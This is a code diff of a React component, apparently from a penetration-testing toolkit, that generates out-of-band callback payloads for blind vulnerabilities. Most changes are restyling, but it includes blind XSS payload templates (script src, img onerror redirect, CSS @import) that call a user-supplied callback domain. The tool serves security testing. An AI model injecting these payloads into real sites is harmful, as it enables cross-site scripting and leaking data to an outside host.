@@ -6,13 +6,13 @@ import { SignalIcon, ClipboardDocumentListIcon, PuzzlePieceIcon } from './Icons.
 import { ToolLayout } from './ToolLayout.tsx';
 
 interface Payload {
-  name: string;
-  value: string;
+    name: string;
+    value: string;
 }
 
 interface PayloadCategory {
-  title: string;
-  payloads: (domain: string) => Payload[];
+    title: string;
+    payloads: (domain: string) => Payload[];
 }
 
 const payloadCategories: PayloadCategory[] = [
@@ -37,8 +37,8 @@ const payloadCategories: PayloadCategory[] = [
         title: "Blind XSS",
         payloads: (domain) => [
             { name: "Script Src", value: `<script src=//${domain}></script>` },
-            { name: "Image Src", value: `<img src=x onerror="document.location='//${domain}'">`},
-            { name: "Import", value: `@import '//${domain}';`},
+            { name: "Image Src", value: `<img src=x onerror="document.location='//${domain}'">` },
+            { name: "Import", value: `@import '//${domain}';` },
         ]
     },
     {
@@ -83,58 +83,58 @@ export const OobInteractionHelper: React.FC = () => {
 
     return (
         <ToolLayout
-          icon={<SignalIcon className="h-8 w-8 text-coral" />}
-          title="OOB Interaction Helper"
-          description={<>Generate Out-of-Band (OOB) payloads for blind vulnerabilities. Use services like <a href="https://interact.sh" target="_blank" rel="noopener noreferrer" className="text-purple-400 hover:underline">interact.sh</a> or Burp Collaborator to get a callback domain.</>}
+            icon={<SignalIcon className="h-8 w-8 text-coral" />}
+            title="OOB Interaction Helper"
+            description={<>Generate Out-of-Band (OOB) payloads for blind vulnerabilities. Use services like <a href="https://interact.sh" target="_blank" rel="noopener noreferrer" className="text-purple-400 hover:underline">interact.sh</a> or Burp Collaborator to get a callback domain.</>}
         >
             <div className="max-w-xl mx-auto">
-                 <label htmlFor="oob-domain" className="block text-sm font-medium text-purple-gray mb-2">Your Callback Domain</label>
-                 <input
+                <label htmlFor="oob-domain" className="label-mini mb-2 block">Your Callback Domain</label>
+                <input
                     id="oob-domain"
                     type="text"
                     value={domain}
                     onChange={(e) => setDomain(e.target.value)}
                     placeholder="e.g., your-id.oastify.com"
-                    className="w-full p-2 bg-purple-medium/60 border-2 border-0 rounded-lg text-white focus:ring-2 focus:ring-purple-500 focus:border-purple-500 focus:outline-none transition-colors font-mono"
-                  />
+                    className="input-premium w-full p-4 font-mono text-sm"
+                />
             </div>
 
-            <div className="mt-6 flex justify-center">
+            <div className="mt-8 flex justify-center">
                 <button
                     onClick={handleGenerate}
                     disabled={!domain.trim()}
-                    className="group relative inline-flex items-center justify-center px-8 py-3 bg-gradient-to-r from-purple-elevated to-coral hover:from-purple-light hover:to-coral-hover disabled:from-gray-600 disabled:to-gray-700 text-white font-bold rounded-lg transition-all duration-300 transform hover:scale-105 disabled:scale-100 disabled:cursor-not-allowed shadow-lg shadow-purple-500/20 overflow-hidden"
+                    className="btn-mini btn-mini-primary !h-12 !px-10 !rounded-xl shadow-glow-coral group gap-3"
                     title="Generate OOB payloads based on the domain"
                 >
-                    <PuzzlePieceIcon className="h-5 w-5 mr-2" />
-                    <span className="relative">Generate Payloads</span>
+                    <PuzzlePieceIcon className="h-5 w-5 group-hover:rotate-12 transition-transform" />
+                    GENERATE OOB INTELLIGENCE
                 </button>
             </div>
-            
-             {generatedPayloads && (
-                <div className="mt-8 space-y-6 animate-fade-in">
+
+            {generatedPayloads && (
+                <div className="mt-10 space-y-8 animate-fade-in">
                     {generatedPayloads.map((category) => (
                         <div key={category.title}>
-                            <h4 className="text-lg font-semibold text-coral-hover mb-3">{category.title}</h4>
-                            <div className="space-y-4">
+                            <h4 className="title-standard !text-lg mb-4 pl-1">{category.title}</h4>
+                            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                                 {category.payloads.map((payload) => (
-                                    <div key={payload.name} className="bg-purple-medium/60/50 p-3 rounded-lg border-0">
-                                        <p className="text-sm font-medium text-purple-gray mb-2">{payload.name}</p>
-                                        <div className="bg-black/40 p-3 rounded-md font-mono text-sm text-purple-300 relative group">
-                                            <pre className="overflow-x-auto"><code>{payload.value}</code></pre>
-                                            <button 
-                                               onClick={() => handleCopy(payload.value)}
-                                               className="absolute top-2 right-2 p-1.5 rounded-md bg-purple-800/50 text-purple-200 opacity-0 group-hover:opacity-100 focus:opacity-100 transition-opacity"
-                                               aria-label={`Copy ${payload.name} payload`}
-                                               title={`Copy ${payload.name} payload`}
+                                    <div key={payload.name} className="card-premium p-4 !bg-ui-bg/40 hover:border-ui-accent/40 transition-all group/card">
+                                        <p className="label-mini mb-3 opacity-70">{payload.name}</p>
+                                        <div className="bg-black/40 p-3 rounded-xl font-mono text-xs text-ui-accent/90 relative group border border-white/5">
+                                            <pre className="overflow-x-auto no-scrollbar"><code className="whitespace-pre-wrap break-all">{payload.value}</code></pre>
+                                            <button
+                                                onClick={() => handleCopy(payload.value)}
+                                                className="absolute top-2 right-2 p-1.5 rounded-lg bg-ui-accent/10 border border-ui-accent/30 text-ui-accent opacity-0 group-hover:opacity-100 focus:opacity-100 transition-all hover:bg-ui-accent/20"
+                                                aria-label={`Copy ${payload.name}`}
+                                                title={`Copy ${payload.name}`}
                                             >
-                                              {copiedPayload === payload.value ? (
-                                                <span className="text-xs font-bold px-1">Copied!</span>
-                                              ) : (
-                                                <ClipboardDocumentListIcon className="h-5 w-5" />
-                                              )}
+                                                {copiedPayload === payload.value ? (
+                                                    <span className="text-[8px] font-black px-1">COPIED</span>
+                                                ) : (
+                                                    <ClipboardDocumentListIcon className="h-4 w-4" />
+                                                )}
                                             </button>
-                                          </div>
+                                        </div>
                                     </div>
                                 ))}
                             </div>
